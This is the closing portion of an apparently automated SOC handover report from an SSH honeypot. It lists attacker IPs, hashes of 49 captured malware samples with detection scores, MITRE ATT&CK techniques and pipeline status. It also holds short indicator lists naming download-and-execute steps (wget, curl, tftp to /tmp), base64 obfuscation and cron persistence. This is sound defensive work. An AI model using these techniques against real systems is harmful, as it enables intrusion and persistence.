| `70.166.167[.]35` | 1 | 2026-07-19 06:32 | 2026-07-19 06:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-07-19 08:36 | 2026-07-19 08:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]89` | 1 | 2026-07-19 05:51 | 2026-07-19 05:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]174` | 1 | 2026-07-19 05:22 | 2026-07-19 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]231` | 1 | 2026-07-19 05:09 | 2026-07-19 05:09 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 39/100 | 🟢 LOW | **24/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `171.8.42[.]112` | CN | CHINANET henan province network | **100** ⚠️ | 50 |
| `49.124.159[.]192` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 11 |
| `158.178.141[.]210` | AU | Oracle Corporation | **100** ⚠️ | 2 |
| `14.194.128[.]158` | IN | Tata Teleservices Limited -GSM Division | **100** ⚠️ | 50 |
| `183.167.217[.]86` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `61.169.54[.]150` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |
| `196.189.126[.]10` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `103.68.22[.]115` | IN | Anonet Network Private Limited | **100** ⚠️ | 17 |
| `35.205.66[.]149` | BE | Google LLC | **100** ⚠️ | 0 |
| `202.72.196[.]75` | ID | PT Multidata Rancana Prima | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 297 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 274 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 48 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 48 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 48 |

---

## 🔕 False Positive Summary (24 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 469 cases |
| Tool 34  | Credential Extractor        | ✅ 334 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 20 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 160 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 24 filtered (5.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 88 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 32 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 275 priority case(s) shown individually · 43 recon entry/entries in table (20 group(s) consolidating 147 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-19T09:55:54Z_
